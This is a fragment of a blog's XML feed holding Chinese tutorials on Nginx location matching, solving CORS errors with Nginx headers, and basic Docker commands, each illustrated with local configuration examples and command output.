]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx中的location配置</title>
    <url>/2024/1117141829.html</url>
    <content><![CDATA[<p>Nginx的location配置，用于定义请求的URI和服务器响应之间的对应关系。</p>
<h2><span id="location语法">location语法</span></h2><p>Nginx的location规则匹配的是URI, 不需要考虑后面的query_string。语法如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location [ = | ~ | ~* | ^~ | 空格 ] /URI &#123; </span><br><span class="line">	... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="location-modifier的解释">location modifier的解释</span></h2><table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;</td>
<td>精确匹配, 如匹配成功就立即停止搜索</td>
</tr>
<tr>
<td>^~</td>
<td>前缀匹配, 不使用正则表达式。如果匹配成功, 并且匹配字符串是最长的，就不再匹配其他location</td>
</tr>
<tr>
<td>~</td>
<td>正则匹配，区分大小写</td>
</tr>
<tr>
<td>~*</td>
<td>正则匹配，不区分大小写</td>
</tr>
<tr>
<td>空格</td>
<td>前缀匹配, 不使用正则表达式</td>
</tr>
</tbody></table>
<span id="more"></span>

<h2><span id="location-modifier的匹配顺序">location modifier的匹配顺序</span></h2><ol>
<li>先精确匹配<code>=</code>，如精确匹配成功会立刻停止搜索</li>
<li>再前缀匹配(<code>^~</code>和空格), 如果匹配最长的结果是<code>^~</code>, 立刻停止搜索; 否则暂存匹配最长的结果(空格)，继续往下走</li>
<li>查找正则匹配(<code>&#39;~&#39;</code>和<code>&#39;~*&#39;</code>), 如果同时有多个正则匹配，按配置文件中定义的先后顺序，优先取配置文件中最上面的，立刻停止搜索；否则往下走</li>
<li>返回第2步保存的结果(匹配最长的空格匹配)</li>
</ol>
<p>官方文档的描述: <a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#location">http://nginx.org/en/docs/http/ngx_http_core_module.html#location</a></p>
<p>以下通过几个示例加深理解</p>
<h2><span id="示例">示例</span></h2><h3><span id="例1nginx官方文档的例子">例1(Nginx官方文档的例子):</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location = / &#123;</span><br><span class="line">    return 200 &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    return 200 &#x27;2&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /documents/ &#123;</span><br><span class="line">    return 200 &#x27;3&#x27;;</span><br><span class="line"></span><br><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    return 200 &#x27;4&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~* \.(gif|jpg|jpeg)$ &#123;</span><br><span class="line">    return 200 &#x27;5&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost/</span><br><span class="line">&#x27;1&#x27;</span><br><span class="line">curl localhost/index.html</span><br><span class="line">&#x27;2&#x27;</span><br><span class="line">curl localhost/documents/document.html</span><br><span class="line">&#x27;3&#x27;</span><br><span class="line">curl localhost/images/1.gif</span><br><span class="line">&#x27;4&#x27;</span><br><span class="line">curl localhost/documents/1.jpg</span><br><span class="line">&#x27;5&#x27;</span><br></pre></td></tr></table></figure>
<p>解释: 对于<code>localhost/documents/1.jpg</code>, 前缀匹配最长结果为空格匹配<code>/documents/</code>, 所以继续正则匹配, 正则匹配命中<code>location ~* \.(gif|jpg|jpeg)$</code>，所以返回5</p>
<h3><span id="例2">例2:</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /document &#123;</span><br><span class="line">    return 200 &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">location ~* ^/document$ &#123;</span><br><span class="line">    return 200 &#x27;2&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost/document</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>解释: 前缀匹配的结果为空格匹配, 所以继续执行正则匹配, 正则匹配可以命中，所以返回2</p>
<h3><span id="例3">例3</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ^~ /doc &#123;</span><br><span class="line">	return 200 &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">location ~ ^/document$ &#123;</span><br><span class="line">    return 200 &#x27;2&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost/document</span><br><span class="line">&#x27;1&#x27;</span><br><span class="line">curl localhost/doc</span><br><span class="line">&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<p>解释: <code>^~</code>前缀匹配命中后，立刻停止搜索，不会进行正则匹配, 所以返回1</p>
<h3><span id="例4">例4</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/document &#123;</span><br><span class="line">    return 200 &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">location ~ ^/document2 &#123;</span><br><span class="line">    return 200 &#x27;2&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost/document2</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>解释: 正则匹配是按照配置文件中定义的顺序，先匹配成功的返回，所以返回1</p>
<h3><span id="例5">例5</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /images/1.jpg &#123;</span><br><span class="line">  return 200  &#x27;1&#x27;;     </span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line">location ^~ /images/ &#123; </span><br><span class="line">  return 200  &#x27;2&#x27;;      </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">location ~ /images/ &#123;        </span><br><span class="line">  return 200  &#x27;3&#x27;;   </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">location ~ /images/1.jpg &#123;        </span><br><span class="line">  return 200  &#x27;4&#x27;;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost/images/1.png </span><br><span class="line">&#x27;3&#x27;</span><br><span class="line">curl localhost/images/1 </span><br><span class="line">&#x27;2&#x27;</span><br></pre></td></tr></table></figure>
<p>解释: </p>
<ul>
<li>对于第1个<code>/images/1.png</code>，前缀匹配最长的是空格(第1个location), 所以继续正则匹配; 正则匹配可以命中第3个和第4个，取最上面那个，所以返回3</li>
<li>对于第2个<code>/images/1</code>，最长的前缀匹配为<code>^~</code>(第2个location)，所以直接返回2</li>
</ul>
<h2><span id="location-实际使用">location 实际使用</span></h2><p>实际使用中，要避免出现上述示例中混乱的配置；可以先放置精确匹配，再前缀匹配，最后是正则匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 精确匹配</span><br><span class="line">    location = / &#123;</span><br><span class="line">        # 配置...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 前缀匹配</span><br><span class="line">    location /static/ &#123;</span><br><span class="line">        # 配置...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 正则匹配</span><br><span class="line">    location ~* \.(jpg|jpeg|png)$ &#123;</span><br><span class="line">        # 配置...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】<a href="https://juejin.cn/post/6908623305129852942">https://juejin.cn/post/6908623305129852942</a><br>【2】<a href="https://juejin.cn/post/7048952689601806366">https://juejin.cn/post/7048952689601806366</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx解决跨域问题的案例演示</title>
    <url>/2024/1119221949.html</url>
    <content><![CDATA[<p>介绍跨域问题前，首先了解浏览器的同源策略(Same-Origin Policy)</p>
<h2><span id="同源策略">同源策略</span></h2><p>同源策略是一种浏览器安全机制，限制了从一个源加载的文档或脚本与另一个源的资源进行交互的能力。</p>
<h3><span id="同源的定义">同源的定义</span></h3><p>如果两个URL的协议、域名(IP)、端口号均相同，则它们是同源的，否则是跨源的。举例如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># http和https协议不同, 不满足同源</span><br><span class="line">http://192.168.1.2/user/1</span><br><span class="line">https://192.168.1.2/user/1</span><br><span class="line"></span><br><span class="line"># IP不同，不满足同源</span><br><span class="line">http://192.168.1.2/user/1</span><br><span class="line">http://192.168.1.3/user/1</span><br><span class="line"></span><br><span class="line"># 域名不同，不满足同源</span><br><span class="line">http://www.zhangsan.com/user/1</span><br><span class="line">http://www.lisi.com/user/1</span><br><span class="line"></span><br><span class="line"># 端口不同，不满足同源</span><br><span class="line">http://192.168.1.2/user/1</span><br><span class="line">http://192.168.1.2:8080/user/1</span><br><span class="line"></span><br><span class="line"># 协议、域名、端口均相同，满足同源, 默认端口就是80</span><br><span class="line">http://www.zhangsan:80/user/1</span><br><span class="line">http://www.zhangsan/user/1</span><br></pre></td></tr></table></figure>
<h3><span id="同源策略的必要性">同源策略的必要性</span></h3><p>避免跨站点脚本攻击，防止恶意网站读取另一个网站的敏感数据，保护用户数据安全</p>
<h2><span id="跨域问题演示">跨域问题演示</span></h2><p>有两台服务器A,B，A和B不满足同源策略。如果从A的页面发送异步请求到B获取数据，就会出现跨域问题。演示如下：</p>
<p>1、创建一台虚拟机, 用Nginx启动两个服务器，如下:</p>
<ul>
<li>服务器A: <a href="http://192.168.52.200/a.html">http://192.168.52.200:80/a.html</a> 页面上添加一个Button, 用户点击Button后发送异步请求到服务器B获取数据</li>
<li>服务器B: <a href="http://192.168.52.200:8080/user">http://192.168.52.200:8080/user</a> 返回一个JSON数据, 值为{“id”: 1, “name”: “peter”, “age: 28”}</li>
</ul>
<p>2、添加服务器A的页面a.html, 编辑<code>/var/www/server_a/a.html</code>，内容如下:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.7.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                $(<span class="string">&quot;#btn&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    $.<span class="title function_">get</span>(<span class="string">&#x27;http://192.168.52.200:8080/user&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me, Get Data!&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、修改Nginx.conf，添加两个服务器的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 服务器A</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  _;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /var/www/server_a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 服务器B</span><br><span class="line">server &#123;</span><br><span class="line">    listen       8080;</span><br><span class="line">    server_name  _;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">    # 返回简单的JSON数据，用于演示</span><br><span class="line">    location /user &#123;</span><br><span class="line">        default_type application/json;</span><br><span class="line">        return 200 &#x27;&#123;&quot;id&quot;:1, &quot;name&quot;:&quot;peter&quot;,&quot;age&quot;:28&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.重新加载Nginx并启动, 访问<code>192.168.52.200/a.html</code>，点击Button, 发现没有显示JSON数据，请求失败。浏览器按F12查到如下报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://192.168.52.200:8080/user&#x27; </span><br><span class="line">from origin &#x27;http://192.168.52.200&#x27; has been blocked by CORS policy: </span><br><span class="line">No &#x27;Access-Control-Allow-Origin&#x27; header is present on the requested resource.</span><br></pre></td></tr></table></figure>
<p>这就是跨域问题。你在浏览器中直接访问<code>http://192.168.52.200:8080/user</code>，是可以返回数据的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.52.200:8080/user</span><br><span class="line">&#123;&quot;id&quot;:1, &quot;name&quot;:&quot;peter&quot;,&quot;age&quot;:28&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="使用nginx解决跨域问题">使用Nginx解决跨域问题</span></h2><p>跨域问题涉及的几个响应头</p>
<ul>
<li>Access-Control-Allow-Origin 指定允许访问的源，可以配置多个，用逗号分隔, 也可以用*代表所有源</li>
<li>Access-Control-Allow-Methods 指定允许的HTTP方法，值可以为GET POST PUT DELETE，用逗号分隔</li>
</ul>
<p><strong>动手实现</strong><br>修改Nginx.conf, 使用add_header指令添加Header，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> server &#123;</span><br><span class="line">     listen       8080;</span><br><span class="line">     server_name  _;</span><br><span class="line">     access_log   access.log;</span><br><span class="line">     include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">     location /user &#123;</span><br><span class="line"># 添加Header, 允许源地址为192.168.52.200的GET,POST请求</span><br><span class="line">         add_header Access-Control-Allow-Origin http://192.168.52.200;	</span><br><span class="line"># add_header Access-Control-Allow-Origin *; #允许所有地址跨域访问</span><br><span class="line">         add_header Access-Control-Allow-Methods GET,POST;</span><br><span class="line">         default_type application/json;</span><br><span class="line">         return 200 &#x27;&#123;&quot;id&quot;:1, &quot;name&quot;:&quot;peter&quot;,&quot;age&quot;:28&#125;&#x27;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>重新加载Nginx, 访问<code>192.168.52.200/a.html</code>，点击Button，发现请求成功。</p>
<h2><span id="参考">参考</span></h2><p><a href="https://www.cnblogs.com/javastack/p/16065851.html">https://www.cnblogs.com/javastack/p/16065851.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker基础</title>
    <url>/2024/1123191048.html</url>
    <content><![CDATA[<h1><span id="什么是容器">什么是容器</span></h1><ul>
<li>容器是一种虚拟化技术，用于将应用程序和它所有依赖项打包在一起，以便在不同环境中移植和运行</li>
<li>应用或服务之间相互隔离，共享一个OS</li>
</ul>
<h1><span id="什么是docker">什么是Docker</span></h1><ul>
<li>一个开源的应用容器引擎，可以让开发者打包一个应用及其依赖包到一个轻量的，可移植的容器中</li>
<li>Docker将应用程序和基础设施分开，以便快速交付软件</li>
</ul>
<h1><span id="docker优点">Docker优点</span></h1><ul>
<li>快速，一致地交付应用。开发，测试，运维可以直接用一套相同环境。</li>
<li>更高效的资源利用。Docker容器共享宿主机内核。</li>
<li>更轻松的迁移和扩展。Docker容器几乎可以在任意平台运行</li>
<li>更简单的更新管理。使用Dockerfile，只需小的配置修改，就能替代以往大量更新工作</li>
</ul>
<span id="more"></span>
<h1><span id="docker和虚拟机比较">Docker和虚拟机比较</span></h1><p>Docker作为一种轻量级的虚拟化方式，与传统的虚拟机相比具有显著优势:</p>
<ul>
<li>Docker容器很快，启动和停止在秒级实现</li>
<li>Docker容器对系统资源需求更少，一台主机可运行数千Docker容器</li>
<li>多个容器之间共享OS</li>
</ul>
<h1><span id="docker应用场景">Docker应用场景</span></h1><ul>
<li>CI&#x2F;CD (持续集成&#x2F;持续部署)</li>
</ul>
<h1><span id="docker安装">Docker安装</span></h1><p><a href="https://pcj600.github.io/2024/1017195632.html">https://pcj600.github.io/2024/1017195632.html</a></p>
<h1><span id="docker配置国内源加速">Docker配置国内源加速</span></h1><p><a href="https://pcj600.github.io/2024/1031225813.html">https://pcj600.github.io/2024/1031225813.html</a></p>
<h1><span id="修改docker容器存储路径">修改Docker容器存储路径</span></h1><p><a href="https://pcj600.github.io/2021/1016200721.html">https://pcj600.github.io/2021/1016200721.html</a></p>
<h1><span id="docker三个核心概念">Docker三个核心概念</span></h1><p>镜像，容器，仓库</p>
<h2><span id="镜像">镜像</span></h2><p>Docker镜像是一个特殊的文件系统,提供容器运行所需程序，库，资源，配置<br>Docker运行容器前需要本地存在对应的镜像。如果本地找不到镜像，Docker会尝试从镜像仓库下载</p>
<h3><span id="获取镜像">获取镜像</span></h3><p>下载最新的ubuntu镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu # 或 docker pull ubuntu:latest</span><br></pre></td></tr></table></figure>
<p>下载指定版本的ubuntu镜像，比如14.04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:14.04</span><br></pre></td></tr></table></figure>
<p>用户也可以选择从其他仓库下载镜像，此时需要指定完整的仓库地址，例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull dl.dockerpool.com:5000/ubuntu</span><br></pre></td></tr></table></figure>
<h3><span id="查看镜像">查看镜像</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    beae173ccac6   2 years ago   1.24MB</span><br><span class="line">mysql        latest    3218b38490ce   2 years ago   516MB</span><br></pre></td></tr></table></figure>
<h3><span id="查看镜像详细信息">查看镜像详细信息</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect [IMAGE ID]</span><br></pre></td></tr></table></figure>
<p>docker inspect返回一个JSON格式数据。如果只需要某一项内容，使用-f参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect ubuntu -f &#123;&#123;&quot;.Architecture&quot;&#125;&#125;</span><br><span class="line">amd64</span><br></pre></td></tr></table></figure>
<h3><span id="删除镜像">删除镜像</span></h3><p>先获取要删除镜像的IMAGE ID，再使用<code>docker rmi</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images  | grep ubuntu</span><br><span class="line">ubuntu       latest    ba6acccedd29   3 years ago   72.8MB</span><br><span class="line">docker rmi ba6acccedd29</span><br></pre></td></tr></table></figure>

<h3><span id="存出或载入镜像">存出或载入镜像</span></h3><p>把镜像存出到本地文件，可以使用docker save命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker save -o busybox.tar busybox:latest</span><br></pre></td></tr></table></figure>
<p>从文件busybox.tar载入镜像，使用docker load命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load --input busybox.tar</span><br></pre></td></tr></table></figure>

<h3><span id="上传镜像">上传镜像</span></h3><p>一般是先对镜像打个tag，再上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker tag test:latest user_repo/test:latest</span><br><span class="line">docker push user_repo/test:latest</span><br></pre></td></tr></table></figure>

<h2><span id="容器">容器</span></h2><h3><span id="什么是容器">什么是容器</span></h3><p>容器是镜像的一个运行实例, 通常一个容器就是一个应用或提供一个服务</p>
<h3><span id="创建容器">创建容器</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker create -it busybox:latest</span><br><span class="line">69ed2220d4d588cdeef8d0f15ce710232512b4ef30290f8a2a41b2ae19210de8</span><br><span class="line">docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE            COMMAND   CREATED          STATUS    PORTS     NAMES</span><br><span class="line">69ed2220d4d5   busybox:latest   &quot;sh&quot;      10 seconds ago   Created             jovial_raman</span><br></pre></td></tr></table></figure>
<p>docker create创建的容器处于停止状态，可以用docker start命令启动它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 69ed2220d4d5</span><br></pre></td></tr></table></figure>

<h3><span id="启动容器">启动容器</span></h3><p>docker run命令用于启动容器，它等价于先执行docker create, 再执行docker start。<br>以下启动一个bash中断，允许用户交互</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>交互模式下, 用户可以按Ctrl+d或输入exit命令退出容器。退出后容器处于终止状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@f21525899f99:/# ps axf</span><br><span class="line">    PID TTY      STAT   TIME COMMAND</span><br><span class="line">      1 pts/0    Ss     0:00 /bin/bash</span><br><span class="line">     16 pts/0    R+     0:00 ps axf</span><br><span class="line">root@f21525899f99:/# exit</span><br><span class="line"></span><br><span class="line"># 退出后，容器处于终止状态</span><br><span class="line"># docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE            COMMAND       CREATED         STATUS                     PORTS     NAMES</span><br><span class="line">f21525899f99   ubuntu:14.04     &quot;/bin/bash&quot;   9 seconds ago   Exited (0) 6 seconds ago             amazing_bassi</span><br></pre></td></tr></table></figure>

<h3><span id="守护态运行">守护态运行</span></h3><p>通过-d参数，实现Docker容器以守护态(daemonized)运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -it ubuntu:14.04 /bin/bash</span><br><span class="line">f53c8a9de7161fdc4b75a5a1ecdaa7dbe4f2208ea01526ec9bcf025fe6f3e874</span><br><span class="line"></span><br><span class="line">docker exec -it f53c8a9de7161fdc4b75a5a1ecdaa7dbe4f2208ea01526ec9bcf025fe6f3e874 bash</span><br><span class="line">root@f53c8a9de716:/# ps axf</span><br><span class="line">    PID TTY      STAT   TIME COMMAND</span><br><span class="line">     16 pts/1    Ss     0:00 bash</span><br><span class="line">     31 pts/1    R+     0:00  \_ ps axf</span><br><span class="line">      1 pts/0    Ss+    0:00 /bin/bash</span><br></pre></td></tr></table></figure>

<h3><span id="终止容器">终止容器</span></h3><p>docker stop用于终止一个运行中的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop [CONTAINER ID]</span><br></pre></td></tr></table></figure>
<p>强行中止容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker kill [CONTAINER ID]</span><br></pre></td></tr></table></figure>
<p>查看所有容器状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<h3><span id="进入容器">进入容器</span></h3><p>docker exec用于在容器运行命令，比如进入一个容器中，启动一个bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it f53c8a9de7161fdc4b75a5a1ecdaa7dbe4f2208ea01526ec9bcf025fe6f3e874 bash</span><br><span class="line">root@f53c8a9de716:/# ps axf</span><br><span class="line">    PID TTY      STAT   TIME COMMAND</span><br><span class="line">     16 pts/1    Ss     0:00 bash</span><br><span class="line">     31 pts/1    R+     0:00  \_ ps axf</span><br><span class="line">      1 pts/0    Ss+    0:00 /bin/bash</span><br></pre></td></tr></table></figure>

<h3><span id="nsenter">nsenter</span></h3><ul>
<li>nsenter是一个用于进入到目标程序所在Namespace中运行命令的工具，一般用于宿主机上调试容器中运行的程序</li>
<li>典型用途是进入容器的网络命名空间。因为容器为了轻量化，通常不包含基础网络调试工具(ip,tcpdump)，调试定位很麻烦</li>
</ul>
<p>举例：启动一个ubuntu容器，通过nsenter进入容器的命名空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动一个ubuntu容器</span><br><span class="line">docker run -d -it ubuntu:14.04 /bin/bash</span><br><span class="line">ef452d2e0c579a7f3636f7a2b6ac4740a5eff0f33cee0bbfbf876632748905e3</span><br><span class="line"></span><br><span class="line"># 查看容器进程ID</span><br><span class="line">PID=$(docker inspect --format &quot;&#123;&#123; .State.Pid &#125;&#125;&quot; ef452d2e0c579a7f3636f7a2b6ac4740a5eff0f33cee0bbfbf876632748905e3)</span><br><span class="line">[root@iZuf65qw76eb18m9yp8b38Z ~]# echo $PID</span><br><span class="line">2931665</span><br><span class="line"></span><br><span class="line"># 进入容器的网络命名空间</span><br><span class="line">nsenter -n --target 2931665</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">14: eth0@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
<h3><span id="删除容器">删除容器</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm [CONTAINER ID]</span><br></pre></td></tr></table></figure>

<h2><span id="仓库">仓库</span></h2><p>存放镜像的地方, 比如DockerHub，可以上传自己的镜像；主机也可以从仓库下载镜像。</p>
<h1><span id="数据卷">数据卷</span></h1><p>使用Docker过程中，需要查看容器内应用生产的数据，或者对数据备份，或者多个容器间进行数据共享，这些涉及到容器的数据管理操作</p>
<ul>
<li>数据卷(Data Volumes)</li>
<li>数据卷容器(Data Volume Containers)</li>
</ul>
<p>数据卷是一个供容器使用的特殊目录，有如下有用特性：</p>
<ul>
<li>数据卷可以在容器间共享和重用</li>
<li>对数据卷修改会立刻生效</li>
<li>对数据卷的更新，不会影响镜像</li>
<li>卷会一直存在，直到没有容器使用</li>
</ul>
<h2><span id="创建数据卷">创建数据卷</span></h2><p><strong>挂载一个主机目录作为数据卷</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -it -v /home/docker:/home/docker ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure>

<h2><span id="网络配置">网络配置</span></h2><p>映射宿主机5000端口到容器的5000端口, 并查看映射端口配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -it -p 5000:5000 -p 3000:3000 ubuntu:14.04 /bin/bash</span><br><span class="line">cb113dc5adb1530f3d4a259ade0d38412c87b6cdd9190f14d1a61453cbd2dd47</span><br><span class="line"># docker port cb113dc5adb1530f3d4a259ade0d38412c87b6cdd9190f14d1a61453cbd2dd47</span><br><span class="line">3000/tcp -&gt; 0.0.0.0:3000</span><br><span class="line">3000/tcp -&gt; [::]:3000</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:5000</span><br><span class="line">5000/tcp -&gt; [::]:5000</span><br></pre></td></tr></table></figure>

<h1><span id="dockerfile创建镜像">Dockerfile创建镜像</span></h1><p>一个基本的Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line"></span><br><span class="line">RUN apt-get install python</span><br><span class="line"></span><br><span class="line">CMD ...</span><br></pre></td></tr></table></figure>
